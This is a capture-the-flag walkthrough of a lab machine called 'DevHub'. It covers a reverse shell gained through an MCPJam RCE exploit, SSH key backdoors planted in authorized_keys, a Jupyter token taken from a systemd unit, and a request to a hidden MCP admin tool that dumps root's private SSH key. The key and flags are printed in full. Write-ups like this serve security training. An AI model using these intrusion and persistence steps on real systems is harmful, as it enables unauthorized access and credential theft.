---
IP: 10.129.161.198
title: DevHub - HTB Walkthrough
description:
date: 2026-10-21
draft: false
tags:
  - htb
  - linux
  - mcp-server
  - mcpjam
  - jupyter
  - web
  - ssh
  - api
---
## Machine Summary

DevHub focuses mainly on exploiting vulnerable development tools and internal service enumeration. We first discover an active MCP Inspector service on port 6274 running a version of MCPJam vulnerable to an unauthenticated remote code execution exploit (CVE-2026-23744). Gaining access via this vulnerability drops us into an initial shell as the mcp-dev user. Enumerating internal services reveals a Jupyter server running locally on port 8888, and reading its systemd configuration file allows us to extract a valid server token. We set up an SSH local port forward to reach it and use the token to log in, gaining a shell as the analyst user. We then discover a local MCP server running on port 5000 and analyze its configuration file to uncover a hardcoded API key and a hidden administrative tool. From there, we port forward the internal service and craft an authenticated POST request to dump the root user's private SSH key, granting us full root access.
## Recon
### Nmap Scan Results
```bash
$ nmap -v -p- --max-retries 1 --min-rate 1000 -oG scans/detailed.gnmap 10.129.161.198

$ nmap -n -sV -sC -p 22,80,6274 -oN scans/service_scan.nmap 10.129.161.198
```
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sat, 10 Oct 2026 10:32:27 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sat, 10 Oct 2026 10:32:27 GMT
|_    Connection: close
```

Nmap picked up a non-standard TCP port 6274, and Nmap service probes did pick up a 200 GET request so it is likely an HTTP service. Scans on port 80 also indicate a redirect to the devhub.htb domain so we can add that to our /etc/hosts file.
```bash
echo "10.129.161.198 devhub.htb" | sudo tee -a /etc/hosts
```
## Initial Access - RCE
### devhub.htb
Visiting [http://devhub.htb](http://devhub.htb) brings us to an Internal Development page. There is a lot of information disclosed, but primarily we are interested in the active MCP Inspector on port 6274, which nmap had picked up earlier, and a Jupyter instance running on internal port 8888.

![](0cbac9b7e1828f85c4f4fa07d8ef9443.png)

### MCPJam - RCE

Going to [http://devhub.htb:6274](http://devhub.htb:6274) brings us to an MCPJam dashboard. MCPJam is an evaluation platform for testing and debugging MCP servers/apps, among other things. We can see that there is no authentication in place here, as we can add servers, check the chat, and modify some resources. The machine is completely disconnected from anything substantial, and we cannot attempt to sign in or create an account as those options are locked out.

![](96719dcf43e5cfe5d83320b1d1a78c81.png)

We can get the software version of 1.4.2 by visiting Settings on the left menu.

![](9f2c0a69892e2f8c960422ce03c68859.png)

Doing some research, we discover that MCPJam version <= 1.4.2 is vulnerable to [CVE-2026-23744](https://github.com/advisories/GHSA-232v-j27c-5pp6), a critical remote code execution (RCE) vulnerability that was patched in version 1.4.3. Reading into the vulnerability, the service is exposed on `0.0.0.0` instead of `127.0.0.1` and lacked authentication, allowing anyone to connect to the exposed port and send requests.

We can employ the exploit hosted on Exploit-DB, [EDB-ID 52625](https://www.exploit-db.com/exploits/52625). In my case the script did not require any modification. We can start a netcat listener and execute the script against our `tun` interface and listening port.
### Shell as mcp-dev
```bash
$ python exploit.py -u http://10.129.161.198:6274 -l 10.10.15.63 -p 80
```

Checking back on our listener we will see the exploit was successful, and we caught a shell as local user `mcp-dev`.
```bash
Listening on 0.0.0.0 80
Connection received on 10.129.161.220 46346
bash: cannot set terminal process group (1085): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```
#### SSH access
Due to poor security controls on the SSH service we can upgrade our shell by generating an SSH key without a passphrase and injecting our public key into the user's authorized_keys file:
- Generate new key on your attack host and copy the public key
```bash
$ ssh-keygen -t ed25519 -a 100 -f id_hacker
$ cat id_hacker.pub

[PUBLICKEY]
```
- Back on the target host, create the directory structure and echo the public key
```bash
mcp-dev@devhub:~$ mkdir -p .ssh
mcp-dev@devhub:~$ echo "[PUBLICKEY]" > .ssh/authorized_keys
```
- Fix picky permissions and login
```bash
$ chmod 0600 id_hacker
$ ssh -i id_hacker mcp-dev@10.129.161.220

Last login: Sat Oct 10 12:28:50 2026 from 10.10.15.63
mcp-dev@devhub:~$
```
## Internal Enum

From the information we gleaned earlier on the main page [http://devhub.htb](http://devhub.htb), we know that there may be a Jupyter server running locally on port 8888. Running `ss` we can see the port 8888 bound and listening on the loopback interface.
```bash
mcp-dev@devhub:~$ ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*
tcp   LISTEN 0      511          0.0.0.0:6274       0.0.0.0:*     users:(("node-MainThread",pid=1292,fd=29))
tcp   LISTEN 0      128        127.0.0.1:8888       0.0.0.0:*
tcp   LISTEN 0      128        127.0.0.1:5000       0.0.0.0:*
tcp   LISTEN 0      128             [::]:22            [::]:*
```

With further enumeration we'll discover a python script `/opt/opsmcp/server.py` which is owned by user `analyst`. We do not have any permissions to read or execute so we can take note and move to further enumerating port 8888.
```bash
mcp-dev@devhub:~$ ls -la /opt/opsmcp/server.py
-rw-r----- 1 analyst analyst 6021 Mar 16  2026 /opt/opsmcp/server.py
```

### Jupyter Instance

We can use our SSH to create a local port forward to gain access to the service on our attack machine.
```bash
$ ssh -L 8888:localhost:8888 -i id_hacker mcp-dev@10.129.161.220
```

Once connected, we'll need to confirm our port forward was successful:
```bash
$ netstat -tunlp | grep 8888
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      2625203/ssh
tcp6       0      0 ::1:8888                :::*                    LISTEN      2625203/ssh
```

Going to `http://localhost:8888/` on our attack machine we'll gain access to a Jupyter server setup that is currently incomplete. It wants a password or a token to continue.
![](7ea1989ec3f81ba39b7b201281268555.png)

Running `jupyter server list` for me did not produce anything. We can however, read the systemd  configuration file and pull a valid server token from that.
```bash
mcp-dev@devhub:~$ cat /etc/systemd/system/jupyter.service
```
```bash
[Unit]
Description=Jupyter Notebook Server
After=network.target

[Service]
Type=simple
User=analyst
WorkingDirectory=/home/analyst
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
Environment=JUPYTER_TOKEN=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
ExecStart=/home/analyst/jupyter-env/bin/jupyter lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' --ServerApp.password='' --ServerApp.allow_origin='' --ServerApp.disable_check_xsrf=False
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

### Shell as analyst
Using the token `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` to login we will immediately be presented with a web shell as the user `analyst`.
![](d138c8f10cfee771126be9dc33403181.png)

We can replicate what we did earlier with mcp-dev and inject our public SSH key into the user's authorized_keys file and have a stable backdoor.
```bash
analyst@devhub:~$ mkdir -p .ssh
analyst@devhub:~$ echo "[PUBLICKEY]" > .ssh/authorized_keys
```

Login via SSH and extract the contents of `user.txt`.
```bash
$ ssh -i id_hacker analyst@10.129.161.220
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

analyst@devhub:~$ id;hostname;cat user.txt
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
devhub
d62b55e2484947dfd5db32ac7278542f
```

## Privilege Escalation - API abuse
### MCP Server Enum

We can now read the file we discovered earlier at `/opt/opsmcp/server.py` We'll find this is the main configuration file for the MCP Server running internally on port 5000. The script discloses some key information. The most interesting is the hidden tool in the API named `ops._admin_dump`. There a few other details we need to extract from the configuration file to make a successful attack on the service.

- We'll need to grab the API key `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
```python
# API Key for authentication│  
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```
- POST Information to call a tool
```python
@app.route('/tools/call', methods=['POST'])│1 additional security update can be applied with ESM Apps.  
def call_tool(): 
   if not check_auth(): 
       return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
```
- The hidden tool name and argument we want to call
```python
elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)

        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })

        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
```

Doing the same thing we did earlier with the Jupyter service we can create a local port forward with SSH to internal port 5000, exposing the MCP service to our attack box.
```bash
$ ssh -L 5000:localhost:5000 -i id_hacker analyst@10.129.161.220
```
### Assemble the Pieces

We can then formulate a POST request using BurpSuite or curl with a couple key points:
- `POST /tools/call`
- `X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a`
- Payload:
```json
{
  "name": "ops._admin_dump",
  "arguments": {
    "target": "ssh_keys",
    "confirm": true
  }
}
```
#### Full request
```http
POST /tools/call HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: keep-alive
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=zKRZ42Ov5M8Bnxy7VwoYlgEWbAYmcRNIgqArLqeQ1PXzkJjmR3K9pD6aNWa8; _xsrf=2|01875fab|65e1df33a65f2a181ba522024e6d7572|1791635631; username-localhost-8888=2|1:0|10:1791636104|23:username-localhost-8888|188:eyJ1c2VybmFtZSI6ICJiOWJkODQ5YThmNTU0NTVjYTRlMjA1MGU4YWViZjQ5OSIsICJuYW1lIjogIkFub255bW91cyBLYWxlIiwgImRpc3BsYXlfbmFtZSI6ICJBbm9ueW1vdXMgS2FsZSIsICJpbml0aWFscyI6ICJBSyIsICJjb2xvciI6IG51bGx9|b9cf291ef60643acc73d7856ef00b07f2a008f16aacda5353a8833432e7fe057
X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: application/json
Content-Length: 109

{
  "name": "ops._admin_dump",
  "arguments": {
    "target": "ssh_keys",
    "confirm": true
  }
}
```

After the request is sent we'll see we get the dump of roots private SSH key.
![](2784caa582e81704d9b92d5d384d7135.png)
### Shell as root

We'll need to make a clean copy of the private key and modify the permissions.
- Clean up and make key file with echo:
```bash
echo -e '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n' > id_root
```
- Fix permissions
```bash
$ chmod 0600 id_root
```

Login as root and extract the contents of `root.txt`.
```bash
$ ssh -i id_root root@10.129.161.220
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

root@devhub:~# id;hostname;cat root.txt
uid=0(root) gid=0(root) groups=0(root)
devhub
feec94394cbce0d8c00a72e32f331037
```